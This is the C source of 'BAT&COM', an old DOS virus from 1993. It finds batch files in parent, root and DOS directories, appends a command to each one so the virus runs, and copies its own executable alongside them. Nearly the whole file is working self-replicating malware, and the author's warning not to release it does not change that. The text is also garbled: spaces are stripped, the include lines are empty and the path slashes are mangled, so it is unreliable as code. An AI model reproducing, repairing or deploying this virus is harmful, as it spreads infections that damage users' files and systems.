/*Thisfileisahigh-levellanguagevirusofadifferentsort.
 * **Itwillsearchoutbatchfilesand,whenfound,placeacopy
 * **ofitselfinthedirectorywiththebatchfilewhileadding
 * **instructionsintheBATtoexecutethisnewfile.Inthisway,
 * **itwillspreadeachtimean"infected"batchisrun.
 * **DisinfectionisdonesimplybydeletingalloftheBAT&COM.COM
 * **filesandremovingthecommandsfrombatchfilesthatruin
 * **them.ThisoneisNOTconfinedtothecurrentdirectory,
 * **somakesureitisonanisolatedmachineandbesureto
 * **cleanupanyinfections.PLEASEDONOTRELEASE!
 * **BAT&COMvirusis(C)1993BlackWolfEnterprises.
 **/
#include
#include
#include
#include

structffblkffblk;

main()
{
    charold_dir[MAXPATH];
    Get_Path( old_dir );                    /*Savetheolddirectory*/
    Pick_A_Dir();                           /*Findanewdirectoryto*/
    Infect_Directory();                     /*infectandinfectit.*/
    chdir( old_dir );                       /*Returntoolddirectory*/
    return(0);
}

Pick_A_Dir()
{
    intdone;
    chdir( ".." );                          /*First,GooutaDIR.*/
    done = findfirst( "*.BAT", &ffblk, 0 ); /*IfnoBATfiles,try*/
/*rootandDOS*/
    if ( done )
    {
        chdir( "//" );
        done = findfirst( "*.BAT", &ffblk, 0 );
        if ( done )
            chdir( "//DOS//" );
    }
    return(0); 　
}

Infect_Directory()
{
    intdone;
    done = findfirst( "*.BAT", &ffblk, 0 );

    while ( !done )                                 /*Findall.BATfiles*/
    {                                               /*andaddcodetorun*/
        Do_Batch();                             /*BAT&COMifnot*/
        done = findnext( &ffblk );              /*alreadythere*/
    }
    if ( findfirst( "BAT&COM.COM", &ffblk, 0 ) )    /*IfBAT&COMdoes*/
    {
        Copy_Virus();
    }                                               /*notexist,then*/
    return(0);
/*copyitintodir.*/
}

Do_Batch()
{
    FILE*batch;
    charInfection_Buffer[12];
    charvpath[MAXPATH];
    Get_Path( vpath );                                      /*Getpathforaddingpath*/
/*specifierincommands*/
    if ( vpath[3] == 0 )
        vpath[2] = 0;                                   /*Keeppathgoodinroot*/
    batch = fopen( ffblk.ff_name, "rt+" );
    fseek( batch, -11, SEEK_END );
    fread( Infection_Buffer, 11, 1, batch );
    Infection_Buffer[11] = 0;                               /*TerminateString*/
    if ( strcmp( Infection_Buffer, "BAT&COM.COM" ) )        /*Checkif*/
    {                                                       /*Batchis*/
        fseek( batch, 0, SEEK_END );                    /*infected.*/
        fprintf( batch, "/n%s//BAT&COM.COM", vpath );
    } /*^-Addcommand*/
/*tobatch*/
    fclose( batch );
    return(0);
}

Copy_Virus()
{
    FILE*old_virus, *new_virus;
    intwrite_length;
    charcopy_buffer[1024]; /*Copythevirusto*/
/*newdirectory*/
    old_virus   = fopen( _argv[0], "rb" );
    new_virus   = fopen( "BAT&COM.COM", "wb" );
    write_length    = 1024;
    while ( write_length == 1024 )
    {
        write_length = fread( copy_buffer, 1, 1024, old_virus );
        fwrite( copy_buffer, write_length, 1, new_virus );
    }
    fclose( old_virus );
    fclose( new_virus );
    return(0);
}

Get_Path( char*path )
{
    strcpy( path, "A://" );
    path[0] = 'A' + getdisk(); /*Returnscurrentpath*/
    getcurdir( 0, path + 3 );
    return(0);
}

